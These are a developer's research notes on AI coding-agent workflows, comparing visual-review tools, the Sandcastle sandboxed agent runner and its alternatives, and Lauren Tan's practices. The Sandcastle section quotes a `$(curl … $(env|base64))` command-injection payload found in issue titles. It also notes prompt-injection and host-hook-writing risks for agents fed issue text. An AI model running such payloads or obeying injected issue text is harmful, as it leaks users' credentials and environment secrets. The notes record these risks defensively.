# Local dev workflow research (2026-10-02)

Research for improving the local dev loop: visual review, Sandcastle and other agent runners, Lauren Tan's (poteto) workflow. Nothing adopted yet. Current baseline: `workflow.md` + the `implement` skill (plan → delegated agents → `fix`/`check`/tests → `/code-review` → PR); no visual verification step, agents run unsandboxed on the host.

Stars / last-push figures are from the GitHub API on 2026-10-02.

## 1. Visual recap / visual review

### `/visual-recap` (Steve Sewell, Builder.io): what Alex actually meant

[BuilderIO/skills](https://github.com/BuilderIO/skills) (4.5k stars, MIT, created 2026-06-10, pushed 2026-09-30). Read: README, `skills/visual-recap/SKILL.md`, `references/local-files.md`, `references/connection.md`, `.github/workflows/pr-visual-recap.yml`.

- **What:** turns a branch, commit, PR diff, or the whole current thread's work into an interactive recap: before/after wireframes of UI changes, `data-model` and `api-endpoint` blocks with change flags, file tree, 3-8 tabs of annotated key diffs. Skips itself for small diffs. Sibling `/visual-plan` does the same for plans before coding.
- **Wireframes are drawn from the diff**, not screenshots of the running app. It complements a verify step; it does not replace one.
- **Output:** MDX rendered by the Agent-Native Plans app ([BuilderIO/agent-native](https://github.com/BuilderIO/agent-native), source open).
- **Default mode is hosted:** publishes through a Plan MCP connector to `plan.agent-native.com` (account + OAuth; diff content stored there). Gives shareable links and comments. The skill forbids an inline fallback.
- **Local-files mode** (`AGENT_NATIVE_PLANS_MODE=local-files`): MDX written to `plans/<slug>/` or a temp dir; `npx @agent-native/core@latest plan local serve --dir <dir> --kind recap --open`. Content stays on the machine, but the viewer is still the hosted Plan UI reading a localhost bridge: needs network, Chromium (Safari blocks it), no hosted comments or sharing. Fully offline requires running the Plan app locally.
- **GitHub Action** (`pr-visual-recap.yml`): one sticky PR comment with a screenshot + plan link per PR. Needs `PLAN_RECAP_TOKEN` and `ANTHROPIC_API_KEY` (or OpenAI) repo secrets, so hosted mode and API billing.
- **Install:** `npx @agent-native/skills@latest add --skill visual-recap` (asks hosted / local / self-hosted, can add managed CLAUDE.md blocks and the Action); or `/plugin marketplace add BuilderIO/skills`; or plain copy `npx skills@latest add BuilderIO/skills --skill visual-recap`.
- **Closest alternative:** visual-explainer `/diff-review` (below): same idea as one self-contained HTML file, no service, no account, no comments.

### Other tools under "visual review"

Two meanings. (a) is the more common skill; the tools Alex half-remembered are (b).

### (a) Agent verifies its own UI

| Tool | What | Install | Notes |
|---|---|---|---|
| [agent-browser](https://github.com/vercel-labs/agent-browser) (vercel-labs, 43k) | Browser CLI: `screenshot --annotate`, `diff screenshot --baseline`, `record start` (needs ffmpeg), bundled `dogfood` QA skill | `npm i -g agent-browser`, `npx skills add vercel-labs/agent-browser` | Fallback driver when the harness has no browser |
| [before-and-after](https://github.com/vercel-labs/before-and-after) (vercel-labs, 389) | Formats existing screenshots/videos into a replaceable before/after block in the PR body | `npx skills add vercel-labs/before-and-after#main`; needs agent-browser, gh 2.99+ | Does no capture itself |
| [compound-engineering](https://github.com/EveryInc/compound-engineering-plugin) `ce-test-browser` / `ce-polish` (EveryInc, 25k) | Maps changed files → routes, reports pass/fail/skip per route; prefers the harness's own browser, falls back to agent-browser | plugin | Closest fit to T3's preview tools |
| [gstack](https://github.com/garrytan/gstack) `/design-review`, `/qa` (garrytan, 135k) | Designer-eye audit, atomic fix commits, before/after screenshots | clone to `~/.claude/skills/gstack`, `./setup`; needs Bun + its own browser | Heavy; routes all browsing through itself. Borrow from, don't install |
| [agent-device](https://github.com/callstack/agent-device) (Callstack, 4.8k) | Mobile equivalent: iOS simulator / Android snapshots, screenshots, `dogfood` skill | CLI + skills | For fitjournal |

### (b) Human reviews in a visual UI

| Tool | What | Install | Notes |
|---|---|---|---|
| [Plannotator](https://github.com/backnotprop/plannotator) (backnotprop, 9.1k) | Browser UI to annotate plans, markdown, HTML artifacts, diffs/PRs; feedback returns to the agent; hooks plan mode | `curl -fsSL https://plannotator.ai/install.sh \| bash`, then `/plugin marketplace add backnotprop/plannotator` | Binary + hooks, not a plain skill; checks GitHub for releases on load |
| [difit](https://github.com/yoshiko-pg/difit) (yoshiko-pg, 3.2k) | Local GitHub-style diff viewer; inline comments print to stdout on exit, agent addresses them; agent can pre-seed comments | `npx skills add yoshiko-pg/difit` | Diffs only, explicit opt-in |
| [visual-explainer](https://github.com/nicobailon/visual-explainer) (nicobailon, 10.1k) | Agent generates a self-contained HTML page: `/diff-review` (file map, Mermaid, before/after, risks), `/plan-review` | plugin, or copy folder to `.agents/skills/` | Read-only, no comment loop back |

Also: [agentation](https://github.com/benjitaylor/agentation) (click-to-annotate on the running app, via MCP); terminal diff reviewers hunk, tuicr, revdiff (last two not opened). Vibe Kanban is sunsetting: skip.

Not checked: Chrome DevTools MCP, Playwright MCP, built-in browser/diff features in Codex and Cursor.

### Recurring patterns

- Driver policy: harness's own browser first, one fallback CLI, never mix drivers mid-run.
- Scope from the diff: changed files → routes/screens → fixed viewports.
- Evidence as artifact: before/after pairs or video in a marked, replaceable PR block.
- Explicit done condition: every route marked pass/fail/skip with a reason.
- For (b): local server, inline comments, structured feedback via stdout or hook, explicit opt-in.

## 2. Sandcastle and other runners

[mattpocock/sandcastle](https://github.com/mattpocock/sandcastle): MIT TypeScript library, npm `@ai-hero/sandcastle`. Orchestrates coding agents in sandboxes via `sandcastle.run()`.

- **Sandboxes:** Docker (default, plain container), Podman, Vercel Firecracker microVMs, custom, or `noSandbox()`.
- **Branch strategies:** `head` (bind-mounts host working dir; Docker default), `merge-to-head` (temp branch in a worktree, merged back), `branch` (named branch in a worktree). Worktree path hard-coded to `<repo>/.sandcastle/worktrees/` (#530 open).
- **Agents:** claudeCode, codex, pi, cursor, opencode, copilot.
- **Invocation:** library-first: write `.sandcastle/main.ts`, run with `npx tsx`. CLI only does `init` and image build/remove.
- **Auth:** `.sandcastle/.env` with `CLAUDE_CODE_OAUTH_TOKEN` (`claude setup-token`, uses the subscription) or `ANTHROPIC_API_KEY`.
- **Loop** (`parallel-planner-with-review` template): Opus planner over open issues → one sandbox + branch per issue (implementer, then reviewer) → merge agent; repeats up to 10 times. Prompts pull context with `gh issue list`. Backlog.md support unverified.
- **Maturity:** 8.2k stars, created 2026-03-17. Releases every few days through v0.12.0 (2026-06-29), nothing since. 113 open issues, 63 open PRs. Matt still comments on issues (2026-09-29).
- **Known problems:** #1010 worktree mode mounts host `.git` read-write (agent can write hooks/config that run on the host); #854 bind-mount worktrees corrupt git worktree metadata on macOS; #870 prompt injection via issue comments; #386 no multi-repo.
- **Live injection attempt seen:** issues #983-988 carry `$(curl … $(env|base64))` payloads in their titles. Its templates feed `gh issue list` into prompts, so this targets its users.
- **Related:** [mattpocock/skills](https://github.com/mattpocock/skills) (grill, `to-spec`, `to-tickets`, `implement`, `tdd`, `code-review`, `triage`). Its README never mentions Sandcastle; the "PRD → issues → Ralph loop → manual QA, Sandcastle as AFK runner" chain is from search snippets only.

### Alternatives

| Tool | Isolation | Parallel | Review/merge | macOS |
|---|---|---|---|---|
| [Claude Code sandbox](https://code.claude.com/docs/en/sandboxing) | Seatbelt: filesystem + domain-allowlist proxy; denies `.git/hooks`, `.git/config` writes | n/a | n/a | Yes, nothing to install |
| [Claude Code worktrees](https://code.claude.com/docs/en/worktrees) | Worktree only | `--worktree`, subagent `isolation: worktree`, `WorktreeCreate` hook for custom paths | Manual | Yes |
| [Docker Sandboxes `sbx`](https://docs.docker.com/ai/sandboxes/) | MicroVM, host-side proxy, credentials stay outside | Per sandbox | Manual | Unverified |
| [container-use](https://github.com/dagger/container-use) | Container + branch per agent, via MCP | Yes | `git checkout <branch>` | Yes; experimental, last release 2025-08 |
| [Conductor](https://www.conductor.build/docs/) | Workspace + branch per task | Yes | Diff → PR → merge → archive | Mac only |
| [Sculptor](https://github.com/imbue-ai/sculptor) | Worktree; container backend experimental | Yes | Diff, PR | Apple Silicon; research preview |
| [Nimbalyst](https://github.com/nimbalyst/nimbalyst) (ex-Crystal) | Worktree | Yes, session kanban | Red/green diff | Yes |

Parallel-session managers seen by repo metadata only, none shown to sandbox: cmux, Superset, Emdash, claude-squad.

### Read

Sandcastle adds container isolation for unattended runs and a scripted plan → parallel implement → review → merge loop outside a Claude session. Worktrees, board and review already exist here (`bin/wt`, Backlog.md, `implement`). Costs: Docker Desktop, a Dockerfile + `main.ts` per repo, a subscription token in `.env`, a worktree path that conflicts with `wt/<repo>/<task>`, glue for Backlog.md. Cheaper first step: Claude Code's native sandbox over the existing worktrees. Revisit if releases resume and #1010, #854 close.

## 3. Lauren Tan (@poteto)

- **Talk:** "How Cursor Turned AI Agents Into Better Engineers", Maven / Lenny's Workshops, 2026-08-12, 60 min: <https://maven.com/p/e23d9c/how-cursor-turned-ai-agents-into-better-engineers>. The specific tweet Alex saw was not found.
- **Transcript:** <https://cho.sh/7D77B5> (no source metadata; matched to the talk by topics). Read through a summarizing model, so quotes below may not be exact.
- **Repo:** [cursor/plugins pstack](https://github.com/cursor/plugins/tree/main/pstack). Claude Code ports, not opened: [alexopotto/pstack-claude](https://github.com/alexopotto/pstack-claude), [michael-denyer/pstack-claude](https://github.com/michael-denyer/pstack-claude).
- **Not accessed:** her X article "How I Use Cursor" (<https://x.com/poteto/article/2058975157503570132>).

### From the talk

- Trust curve: start heavily in the loop with a handful of agents; parallelize only after trust. Now mostly cloud agents, auto-merging PRs.
- Verification is the core skill: the agent must run the code, take CPU traces or heap snapshots. A control skill (Chrome DevTools Protocol) plus a "feature map" telling the agent how to reach each feature (shortcuts, DOM attributes).
- Evals for skills: coordinator, blinded subagents, a rubric, looped until 10/10.
- Hard over soft constraints: codebase structure, import blocking, CI lints, compiler diagnostics ahead of rules and skills.
- Repeated review feedback is a code smell: turn it into a hard rule.
- Atomic PRs, 50 to ~1000 lines.

### From pstack

- `/poteto-mode` matches the task to one of 23 playbooks and copies its steps into a todo list.
- Feature playbook: "You own the design. Plan, review, verify. Delegate implementation."
- Throughput checkpoint before fanning out: blocking first steps, independent workstreams, shared mutable state, smallest safe decomposition.
- One worktree per parallel task, off main.
- `/arena` (N attempts, graft the best), `/swarm` (N slices, one report), `/interrogate` (other models attack the diff).
- Overnight runs: fresh worktree, a pass/fail finish condition ("a duration is not a finish condition"), `decisions.tsv` log, escape hatch. No owner merges on its own verdict.
- PR body: Why / Scope / Tradeoffs / Blast Radius / Verification.

## Candidate changes to our workflow

1. **Verify step in `implement`** between test and review: drive the app (T3 preview tools first, agent-browser fallback, agent-device for iOS), scope from the diff, mark each `qa/` case pass/fail/skip, attach before/after to the PR. `qa/` specs double as poteto's "feature map" if they gain a "how to reach it" line.
2. **Recap for review:** trial `/visual-recap` in local-files mode on the next large delegated PR (at `implement`'s land step). Open decision: hosted mode (comments, shareable link, Action; diffs on Builder's servers) vs local-files vs visual-explainer (no service). difit / Plannotator only if inline comment-back is wanted.
3. **Native sandbox** on for delegated/unattended agents. Unverified: whether it applies under the T3 Code harness.
4. **Borrow from pstack:** pass/fail finish condition before any long run; decomposition checkpoint before parallel agents; repeated review findings become a lint in the project's `check`.
5. Sandcastle: skip for now (see § 2 Read).
